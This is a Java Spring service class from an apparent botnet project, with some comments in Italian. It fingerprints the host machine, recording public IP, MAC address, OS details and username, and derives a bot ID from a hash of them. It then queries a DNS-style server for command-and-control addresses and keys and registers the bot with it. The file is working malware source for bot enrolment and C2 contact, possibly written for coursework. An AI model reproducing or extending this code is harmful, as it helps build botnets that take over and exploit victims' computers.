package cs.sii.service.connection;

import java.io.FileNotFoundException;
import java.io.IOException;
import java.io.UnsupportedEncodingException;
import java.lang.reflect.Type;
import java.net.InetAddress;
import java.net.NetworkInterface;
import java.net.SocketException;
import java.net.UnknownHostException;
import java.nio.channels.NetworkChannel;
import java.security.InvalidAlgorithmParameterException;
import java.security.InvalidKeyException;
import java.security.NoSuchAlgorithmException;
import java.security.PublicKey;
import java.util.ArrayList;
import java.util.Enumeration;
import java.util.Iterator;
import java.util.List;

import javax.crypto.BadPaddingException;
import javax.crypto.IllegalBlockSizeException;
import javax.crypto.NoSuchPaddingException;

import org.apache.commons.codec.binary.Base64;
import org.apache.commons.codec.digest.DigestUtils;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.stereotype.Service;

import com.google.common.reflect.TypeToken;

import cs.sii.config.onLoad.Config;
import cs.sii.domain.Conversions;
import cs.sii.domain.IP;
import cs.sii.domain.Pairs;
import cs.sii.domain.SyncCeCList;
import cs.sii.model.bot.Bot;
import cs.sii.service.crypto.CryptoPKI;
import cs.sii.service.crypto.CryptoUtils;

@Service("NetworkService")
public class NetworkService {

	@Autowired
	private Config engineBot;

	// Ip dei command e conquer
	@Autowired
	private SyncCeCList commandConquerIps;

	// Ip dei bot
	// @Autowired
	// private SyncCeCList botIps;

	@Autowired
	private AsyncRequest asyncRequest;

	@Autowired
	private CryptoPKI pki;

	@Autowired
	private CryptoUtils cryptoUtils;
	private static final String IP_REGEX = "^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$";
	private static final String MAC_REGEX = "^([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})$";

	private IP ip;
	private String mac;
	private String idHash;
	private String os;

	private long milli;

	private String versionOS;

	private String archOS;

	private String usernameOS;

	public NetworkService() {
	}

	/**
	 * @return
	 * @throws InvalidKeyException
	 * @throws InvalidAlgorithmParameterException
	 * @throws IllegalBlockSizeException
	 * @throws BadPaddingException
	 * @throws NoSuchAlgorithmException
	 * @throws NoSuchPaddingException
	 * @throws IOException
	 */
	public Boolean loadNetwork()
			throws InvalidKeyException, InvalidAlgorithmParameterException, IllegalBlockSizeException,
			BadPaddingException, NoSuchAlgorithmException, NoSuchPaddingException, IOException {
		ArrayList<String> netPar = new ArrayList<String>();
		netPar = cryptoUtils.decodeStringsFromFile("");
		this.ip = new IP(netPar.get(0));
		System.out.println("My IP: " + ip);
		this.mac = netPar.get(1);
		System.out.println("My MAC: " + mac);
		this.os = netPar.get(2);
		System.out.println("My OS: " + os);
		this.milli = Long.parseLong(netPar.get(3));
		this.versionOS = netPar.get(4);
		System.out.println("My ver: " + versionOS);
		this.archOS = netPar.get(5);
		System.out.println("My arch: " + archOS);
		this.usernameOS = netPar.get(6);
		System.out.println("My user: " + usernameOS);
		this.idHash = netPar.get(7);
		System.out.println("My IdHash: " + idHash);

		String os1 = System.getProperty("os.name");
		String versionOS1 = System.getProperty("os.version");
		String archOS1 = System.getProperty("os.arch");
		String usernameOS1 = System.getProperty("user.name");

		if ((!os.matches(os1)) || (!versionOS.matches(versionOS1)) || (!archOS.matches(archOS1))
				|| (!usernameOS.matches(usernameOS1))) {
			throw new IOException();
		}
		return true;

	}

	/**
	 * @return
	 */
	public ArrayList<String> getAllIpAddresses() {

		ArrayList<String> ips = new ArrayList<>();

		try {
			Enumeration<?> e = NetworkInterface.getNetworkInterfaces();
			while (e.hasMoreElements()) {
				NetworkInterface n = (NetworkInterface) e.nextElement();
				Enumeration<?> ee = n.getInetAddresses();
				while (ee.hasMoreElements()) {
					InetAddress i = (InetAddress) ee.nextElement();
					if (i.getHostAddress().matches(IP_REGEX)) {
						ips.add(i.getHostAddress());
					}
				}
			}
		} catch (SocketException e) {
			e.printStackTrace();
			return null;
		}

		return ips;
	}

	/**
	 * @return mac address of the machine running the program
	 */
	public String getMac() {

		InetAddress ip;
		StringBuilder sb = new StringBuilder();
		try {
			ip = InetAddress.getLocalHost();
			// System.out.println("Current IP address : " +
			// ip.getHostAddress());

			NetworkInterface network = NetworkInterface.getByInetAddress(ip);
			byte[] mac = network.getHardwareAddress();
			// System.out.print("Current MAC address : ");

			for (int i = 0; i < mac.length; i++) {
				sb.append(String.format("%02X%s", mac[i], (i < mac.length - 1) ? "-" : ""));
			}
			System.out.println(sb.toString());

		} catch (UnknownHostException e) {
			e.printStackTrace();
		} catch (SocketException e) {
			e.printStackTrace();
		}
		return sb.toString();
	}

	/**
	 * @return
	 */
	@SuppressWarnings("unchecked")
	public boolean firstConnectToMockServerDns() {

		String url = engineBot.getDnsip() + ":" + engineBot.getDnsport() + engineBot.getUrirequest();
		Pairs<IP, PublicKey> result = new Pairs<IP, PublicKey>();
		Integer counter = 0;

		while (counter <= AsyncRequest.REQNUMBER) {
			try {
				result = asyncRequest.getIpCeCFromDnsServer(url);
				commandConquerIps.addCeC(result);
				commandConquerIps.getCeCList().forEach(ip -> System.out.println(ip.getValue1()));
				return Boolean.TRUE;
			} catch (Exception ex) {
				System.err.println("Errore durante la richiesta di IP\n" + ex);
				counter++;
			}

			try {
				Thread.sleep(250);
			} catch (InterruptedException e) {
				e.printStackTrace();
			}
		}

		return Boolean.FALSE;
	}

	/**
	 * @return
	 */
	public String getMachineInfo() {
		ip = new IP(getMyIpCheckInternet());

		// prendi il mac
		mac = getMac();

		// prendi il sistema operativo
		os = System.getProperty("os.name");
		versionOS = System.getProperty("os.version");
		archOS = System.getProperty("os.arch");
		usernameOS = System.getProperty("user.name");


		// aggiungi nonce time.millis
		milli = System.currentTimeMillis();

		// genera hash
		byte[] hash = DigestUtils.sha256(os + versionOS + archOS + usernameOS + milli);

		idHash = Base64.encodeBase64String(hash);
		System.out.println("jjjj " + idHash + "   " + hash.toString());
		// salva hash su properties;

		// genera Bot
		ArrayList<Object> data = new ArrayList<Object>();
		data.add(ip);
		data.add(mac);
		data.add(os);
		data.add(milli);
		data.add(versionOS);
		data.add(archOS);
		data.add(usernameOS);
		data.add(idHash);

		try {
			cryptoUtils.encodeObjsToFile("", data);
		} catch (InvalidKeyException | NoSuchAlgorithmException | NoSuchPaddingException | UnsupportedEncodingException
				| InvalidAlgorithmParameterException | IllegalBlockSizeException | BadPaddingException
				| FileNotFoundException e) {
		}
		return idHash;

	}

	/**
	 * @return
	 */
	private String getMyIpCheckInternet() {
		String result = "";
		Integer counter = 0;
		while (true) {
			try {
				result = asyncRequest.askMyIpToAmazon();
				if (result.matches(IP_REGEX))
					return result;
			} catch (Exception ex) {
				System.err.println("no internet\n");
				counter++;
				try {
					Thread.sleep(250);// TODO cambiare il tempo e prenderlo da
										// properties
				} catch (InterruptedException e) {
					e.printStackTrace();
				}
			}

		}

	}

	// TODO DA VEDERE
	/**
	 * @return
	 */
	public Boolean updateDnsInformation() {

		String url =  engineBot.getDnsip() + ":" + engineBot.getDnsport() + engineBot.getUrirequest();
		Boolean result = false;
		Integer counter = 0;

		while (counter <= AsyncRequest.REQNUMBER) {
			try {
				result = asyncRequest.sendInfoToDnsServer(url, this.ip, pki.getPubRSAKey());

				System.out.println("Ip tornato " + result);

				return Boolean.TRUE;
			} catch (Exception ex) {
				System.err.println("Errore durante aggiornamento info DNS\n" + ex);
				counter++;
			}

			try {
				Thread.sleep(250);
			} catch (InterruptedException e) {
				e.printStackTrace();
			}
		}

		return Boolean.FALSE;

	}

	public boolean updateBotNetwork() {
		return true;
	}

	public SyncCeCList getCommandConquerIps() {
		return commandConquerIps;
	}

	public IP getIp() {
		return ip;
	}

	public void setIp(IP ip) {
		this.ip = ip;
	}

	public String getIdHash() {
		return idHash;
	}

	public void setIdHash(String idHash) {
		this.idHash = idHash;
	}

	public String getOs() {
		return os;
	}

	public void setOs(String os) {
		this.os = os;
	}

	public void setMac(String mac) {
		this.mac = mac;
	}

	// public SyncCeCList getBotIps() {
	// return botIps;
	// }

}
